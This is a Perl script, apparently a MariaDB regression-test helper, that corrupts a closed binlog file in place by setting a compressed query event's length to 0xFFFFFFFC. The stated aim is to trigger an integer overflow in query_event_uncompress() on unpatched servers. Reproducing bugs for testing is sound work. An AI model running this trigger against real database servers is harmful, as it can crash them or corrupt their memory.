#!/usr/bin/perl
# corrupt_binlog.pl
#
# Patches the first QUERY_COMPRESSED_EVENT in a MariaDB binlog file,
# setting un_len to 0xFFFFFFFC to trigger integer overflow in
# query_event_uncompress() on an unpatched server.
#
# The file is patched IN PLACE. Run this on a closed binlog file only
# (after FLUSH BINARY LOGS has rotated the master to a new file).
#
# Usage: perl corrupt_binlog.pl <binlog_file>
#
# Maintenance notes:
#   If QUERY_HEADER_LEN (13), Q_DB_LEN_OFFSET (8), or
#   Q_STATUS_VARS_LEN_OFFSET (11) change in sql/log_event.h,
#   update the constants below accordingly.
#
# Debug output: all lines prefixed CORRUPT_DEBUG

use strict;
use warnings;

my ($binlog_file) = @ARGV;
die "Usage: $0 <binlog_file>\n" unless $binlog_file;

warn "CORRUPT_DEBUG: opening $binlog_file\n";

open(my $fh, '<:raw', $binlog_file) or die "Cannot open $binlog_file: $!";
my $data;
{ local $/; $data = <$fh>; }
close($fh);

my $len = length($data);
warn "CORRUPT_DEBUG: file size=$len bytes\n";

# Binlog magic: fe 62 69 6e
my $magic = substr($data, 0, 4);
die "Not a binlog file (bad magic)\n"
    unless $magic eq "\xfe\x62\x69\x6e";
warn "CORRUPT_DEBUG: magic OK\n";

# Constants from sql/log_event.h
use constant MAGIC_LEN                => 4;
use constant COMMON_HEADER_LEN        => 19;
use constant EVENT_TYPE_OFFSET        => 4;
use constant EVENT_LEN_OFFSET         => 9;
use constant QUERY_COMPRESSED_EVENT   => 0xa5;
use constant Q_DB_LEN_OFFSET          => 8;   # in post-header
use constant Q_STATUS_VARS_LEN_OFFSET => 11;  # in post-header
use constant QUERY_POST_HEADER_LEN    => 13;
use constant BAD_UN_LEN               => 0xFFFFFFFC;

my $pos = MAGIC_LEN;
my $found = 0;

while ($pos < $len) {
    my $event_type = unpack('C', substr($data, $pos + EVENT_TYPE_OFFSET, 1));
    my $event_len  = unpack('V', substr($data, $pos + EVENT_LEN_OFFSET, 4));

    warn sprintf("CORRUPT_DEBUG: offset=0x%x type=0x%02x len=%d\n",
                 $pos, $event_type, $event_len);

    if ($event_type == QUERY_COMPRESSED_EVENT) {
        warn sprintf("CORRUPT_DEBUG: found QUERY_COMPRESSED_EVENT at 0x%x\n", $pos);

        # Walk post-header to find un_len
        # Layout after common header:
        #   [13 bytes post-header]
        #     byte 8:  db_len
        #     byte 11: status_vars_len (2 bytes LE)
        #   [status_vars_len bytes]
        #   [db_len + 1 bytes] (db name + NUL)
        #   [un_len flag byte + length bytes]  <-- we patch here
        my $ph_start = $pos + COMMON_HEADER_LEN;
        my $db_len   = unpack('C', substr($data, $ph_start + Q_DB_LEN_OFFSET, 1));
        my $sv_len   = unpack('v', substr($data, $ph_start + Q_STATUS_VARS_LEN_OFFSET, 2));

        warn "CORRUPT_DEBUG: db_len=$db_len status_vars_len=$sv_len\n";

        my $flag_offset = $pos + COMMON_HEADER_LEN + QUERY_POST_HEADER_LEN
                        + $sv_len + $db_len + 1;

        my $flag_byte     = unpack('C', substr($data, $flag_offset, 1));
        my $old_len_bytes = $flag_byte & 0x07;

        warn sprintf("CORRUPT_DEBUG: flag_offset=0x%x flag=0x%02x old_len_bytes=%d\n",
                     $flag_offset, $flag_byte, $old_len_bytes);

        # Read and print current un_len
        my $current_un_len = 0;
        if    ($old_len_bytes == 1) { $current_un_len = unpack('C', substr($data, $flag_offset+1, 1)); }
        elsif ($old_len_bytes == 2) { $current_un_len = unpack('n', substr($data, $flag_offset+1, 2)); }
        elsif ($old_len_bytes == 4) { $current_un_len = unpack('V', substr($data, $flag_offset+1, 4)); }
        warn "CORRUPT_DEBUG: current un_len=$current_un_len\n";

        # Patch: 0x84 = compressed flag + 4-byte length indicator
        # Followed by BAD_UN_LEN in little-endian
        my $new_encoding  = pack('CV', 0x84, BAD_UN_LEN);
        my $delta         = 4 - $old_len_bytes;

        substr($data, $flag_offset, 1 + $old_len_bytes) = $new_encoding;
        warn sprintf("CORRUPT_DEBUG: patched un_len to 0x%08X\n", BAD_UN_LEN);

        # Update event_len in common header if size changed
        if ($delta != 0) {
            my $old_event_len = unpack('V', substr($data, $pos + EVENT_LEN_OFFSET, 4));
            my $new_event_len = $old_event_len + $delta;
            substr($data, $pos + EVENT_LEN_OFFSET, 4) = pack('V', $new_event_len);
            warn "CORRUPT_DEBUG: event_len $old_event_len -> $new_event_len (delta=$delta)\n";
        }

        $found = 1;
        last;
    }

    last unless $event_len > 0;
    $pos += $event_len;
}

die "CORRUPT_DEBUG: no QUERY_COMPRESSED_EVENT found in $binlog_file\n" unless $found;

# Write patched data back to the same file (in place)
open(my $out, '>:raw', $binlog_file) or die "Cannot write $binlog_file: $!";
print $out $data;
close($out);

warn "CORRUPT_DEBUG: patched file written to $binlog_file\n";
exit 0;
